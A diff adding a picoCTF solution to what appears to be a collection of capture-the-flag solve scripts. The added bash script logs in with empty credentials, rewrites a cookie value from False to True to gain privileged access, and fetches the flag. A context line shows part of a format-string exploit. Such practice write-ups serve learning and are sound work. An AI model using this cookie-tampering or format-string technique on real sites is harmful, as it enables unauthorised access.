@@ -37,6 +37,18 @@ payload += '%hhn'
 print(payload)
 ```
 
+Solves [picoctf#46](https://play.picoctf.org/practice/challenge/46)
+-------------------------------------------------------------------
+
+```bash
+#!/bin/bash
+
+curl -sLX POST -c cookies.txt -b cookies.txt -d 'user=&password=' 'https://jupiter.challenges.picoctf.org/problem/44573/login' > /dev/null
+sed -i 's/False$/True/' cookies.txt
+curl -sL -c cookies.txt -b cookies.txt 'https://jupiter.challenges.picoctf.org/problem/44573/flag' | hq code text
+rm cookies.txt
+```
+
 Solves [picoctf#112](https://play.picoctf.org/practice/challenge/112)
 ---------------------------------------------------------------------
 
